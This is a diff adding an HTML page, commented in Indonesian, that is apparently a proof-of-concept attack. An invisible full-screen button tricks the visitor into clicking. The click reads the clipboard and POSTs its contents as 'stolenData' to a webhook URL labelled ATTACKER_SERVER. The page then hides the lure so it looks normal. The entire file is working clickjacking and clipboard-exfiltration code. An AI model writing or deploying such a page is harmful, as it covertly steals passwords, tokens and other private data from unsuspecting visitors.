@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<body style="height: 100vh; width: 100vw; margin: 0; display: flex; align-items: center; justify-content: center; background-color: white;">
+    
+    <!-- Elemen pancingan ini menutupi seluruh layar -->
+    <button id="pancingan" style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; opacity: 0; z-index: 9999;">
+        Klik untuk melanjutkan
+    </button>
+
+    <div id="hasil" style="font-family: sans-serif; color: #333;">Memuat...</div>
+
+    <script>
+        const ATTACKER_SERVER = " https://webhooksite.net/bb68cf8b-0195-4e27-ae86-f786850da709";
+
+        document.getElementById('pancingan').addEventListener('click', async () => {
+            try {
+                // Meminta izin pembacaan clipboard
+                const text = await navigator.clipboard.readText();
+                
+                // Mengirim data ke server penyerang
+                await fetch(ATTACKER_SERVER, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ stolenData: text })
+                });
+
+                // Menghilangkan elemen pancingan setelah berhasil agar aplikasi terlihat normal
+                document.getElementById('pancingan').style.display = 'none';
+                document.getElementById('hasil').innerText = "Konten dimuat.";
+            } catch (err) {
+                console.error("Gagal akses clipboard:", err);
+            }
+        });
+    </script>
+</body>
+</html>
